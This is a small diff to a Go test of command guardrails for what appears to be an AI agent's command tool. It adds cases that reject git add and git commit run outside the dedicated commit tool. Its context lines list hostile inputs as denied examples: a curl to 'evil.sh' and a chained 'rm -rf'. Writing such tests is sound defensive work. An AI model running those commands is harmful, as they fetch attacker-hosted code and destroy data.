@@ -123,6 +123,10 @@ func TestCommandGuardrails(t *testing.T) {
 		"curl https://evil.sh/x":   "not an allowlisted binary",
 		"go run ./cmd/x":           "allows only",
 		"git push origin main":     "allows only",
+		// git mutation is a side door around the write set: it must go through
+		// git_commit, never run_cmd.
+		"git add -A":        "allows only",
+		"git commit -m fix": "allows only",
 		"go build ./... && rm -rf": "shell metacharacters",
 		"go test ./... | tee log":  "shell metacharacters",
 	}
